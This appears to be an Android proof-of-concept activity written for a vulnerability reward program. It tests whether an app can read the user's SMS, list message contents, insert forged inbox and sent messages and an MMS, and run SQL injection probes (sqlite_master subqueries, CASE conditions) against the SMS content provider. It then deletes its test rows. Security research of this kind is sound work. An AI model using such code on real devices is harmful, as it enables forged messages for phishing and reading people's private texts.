package com.vrp.poc;

import android.app.Activity;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SmsWriteVerifyActivity extends Activity {
    private static final String TAG = "SmsWriteVerify";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(9);
        logView.setText("SMS Write Verification PoC\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        // Count SMS before
        log("=== Step 1: Count SMS before write ===");
        int beforeCount = countSms();
        log("SMS count before: " + beforeCount);

        // List existing SMS
        log("\n--- Existing SMS ---");
        listSms(5);

        // Test 2: Try to insert a fake SMS with unique marker
        log("\n=== Step 2: Insert fake SMS ===");
        String marker = "VRP_TEST_" + System.currentTimeMillis();
        Uri insertedUri = null;
        try {
            ContentValues cv = new ContentValues();
            cv.put("address", "+15551234567");
            cv.put("body", "Test message " + marker);
            cv.put("type", 1); // inbox
            cv.put("read", 0);
            cv.put("date", System.currentTimeMillis());
            insertedUri = getContentResolver().insert(
                Uri.parse("content://sms/inbox"), cv);
            log("Insert result URI: " + insertedUri);
        } catch (Exception e) {
            log("Insert error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Count SMS after
        log("\n=== Step 3: Count SMS after write ===");
        int afterCount = countSms();
        log("SMS count after: " + afterCount);
        log("Delta: " + (afterCount - beforeCount));

        // Search for our inserted message
        log("\n--- Search for inserted message ---");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"_id", "address", "body", "date", "read"},
                "body LIKE ?",
                new String[]{"%VRP_TEST_%"},
                null);
            if (c != null) {
                log("Found " + c.getCount() + " messages with marker");
                while (c.moveToNext()) {
                    log("  id=" + c.getString(0) + " addr=" + c.getString(1) +
                        " body=" + c.getString(2) + " read=" + c.getString(4));
                }
                c.close();
            }
        } catch (Exception e) {
            log("Search error: " + e.getMessage());
        }

        // If we got a URI, try to read it back
        if (insertedUri != null) {
            log("\n--- Read back inserted URI ---");
            try {
                Cursor c = getContentResolver().query(insertedUri, null, null, null, null);
                if (c != null) {
                    log("URI query: " + c.getCount() + " rows");
                    if (c.moveToFirst()) {
                        for (int i = 0; i < c.getColumnCount(); i++) {
                            String val = c.getString(i);
                            if (val != null && val.length() > 0) {
                                log("  " + c.getColumnName(i) + " = " + val);
                            }
                        }
                    }
                    c.close();
                }
            } catch (Exception e) {
                log("Read back error: " + e.getMessage());
            }
        }

        // Test 3: Try other SMS tables
        log("\n=== Step 4: Try write to sent ===");
        try {
            ContentValues cv = new ContentValues();
            cv.put("address", "+15559876543");
            cv.put("body", "Fake sent " + marker);
            cv.put("type", 2); // sent
            cv.put("date", System.currentTimeMillis());
            Uri sentUri = getContentResolver().insert(
                Uri.parse("content://sms/sent"), cv);
            log("Sent insert: " + sentUri);
        } catch (Exception e) {
            log("Sent insert error: " + e.getMessage());
        }

        // Test 4: Try to write MMS
        log("\n=== Step 5: MMS write test ===");
        try {
            ContentValues cv = new ContentValues();
            cv.put("msg_box", 1);
            cv.put("ct_t", "application/vnd.wap.multipart.related");
            Uri mmsUri = getContentResolver().insert(
                Uri.parse("content://mms"), cv);
            log("MMS insert: " + mmsUri);
        } catch (Exception e) {
            log("MMS insert error: " + e.getMessage());
        }

        // Count final
        log("\n=== Step 6: Final SMS count ===");
        int finalCount = countSms();
        log("Final SMS count: " + finalCount);
        log("Total delta from start: " + (finalCount - beforeCount));

        // Cleanup: try to delete what we inserted
        log("\n=== Step 7: Cleanup ===");
        try {
            int deleted = getContentResolver().delete(
                Uri.parse("content://sms"),
                "body LIKE ?",
                new String[]{"%VRP_TEST_%"});
            log("Cleanup deleted: " + deleted);
        } catch (Exception e) {
            log("Cleanup error: " + e.getMessage());
        }

        // Also test: can we write to SMS without READ_SMS?
        // (Would need a separate test with no permissions granted)
        log("\n=== Step 8: SMS SQLi test ===");
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"_id"},
                "(SELECT 1 FROM sqlite_master LIMIT 1) = 1",
                null, null);
            if (c != null) {
                log("SMS SQLi subquery: " + c.getCount() + " rows");
                c.close();
                Cursor c2 = getContentResolver().query(
                    Uri.parse("content://sms"),
                    new String[]{"_id"},
                    "(SELECT 1 FROM sqlite_master LIMIT 1) = 99",
                    null, null);
                if (c2 != null) {
                    log("SMS SQLi false: " + c2.getCount() + " rows");
                    c2.close();
                }
            }
        } catch (Exception e) {
            log("SMS SQLi: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test CASE injection on SMS
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"_id"},
                "CASE WHEN 1=1 THEN 1 ELSE 0 END = 1",
                null, null);
            if (c != null) {
                log("SMS CASE true: " + c.getCount());
                c.close();
            }
            Cursor c2 = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"_id"},
                "CASE WHEN 1=0 THEN 1 ELSE 0 END = 1",
                null, null);
            if (c2 != null) {
                log("SMS CASE false: " + c2.getCount());
                c2.close();
            }
        } catch (Exception e) {
            log("SMS CASE: " + e.getMessage());
        }

        log("\n=== ALL TESTS COMPLETE ===");
    }

    private int countSms() {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"), new String[]{"_id"}, null, null, null);
            if (c != null) {
                int count = c.getCount();
                c.close();
                return count;
            }
        } catch (Exception e) {
            log("Count error: " + e.getMessage());
        }
        return -1;
    }

    private void listSms(int limit) {
        try {
            Cursor c = getContentResolver().query(
                Uri.parse("content://sms"),
                new String[]{"_id", "address", "body", "type", "date"},
                null, null, "date DESC LIMIT " + limit);
            if (c != null) {
                while (c.moveToNext()) {
                    String body = c.getString(2);
                    if (body != null && body.length() > 40) body = body.substring(0, 40) + "...";
                    log("  [" + c.getString(0) + "] " + c.getString(1) + " type=" +
                        c.getString(3) + ": " + body);
                }
                c.close();
            }
        } catch (Exception e) {
            log("List error: " + e.getMessage());
        }
    }
}
